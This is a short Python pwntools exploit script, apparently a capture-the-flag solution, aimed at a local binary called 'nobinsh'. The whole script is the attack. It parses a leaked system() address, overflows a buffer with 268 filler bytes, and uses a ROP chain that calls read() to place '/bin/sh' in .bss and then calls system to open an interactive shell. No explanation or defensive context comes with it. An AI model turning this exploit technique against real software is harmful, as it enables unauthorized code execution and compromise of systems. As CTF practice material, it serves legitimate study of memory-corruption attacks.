from pwn import *

p = process("./nobinsh")

elf = ELF("./nobinsh")
libc = elf.libc
bss = elf.bss()

pppr = 0x08048749

p.recvuntil("system : ")
system = int(p.recvline().split()[0], 16)

payload = ""
payload += "A" * 268

payload += p32(elf.plt['read'])
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(50)

payload += p32(system)
payload += "AAAA"
payload += p32(bss)

pause()

p.sendline(payload)

p.sendline("/bin/sh\x00")

p.interactive()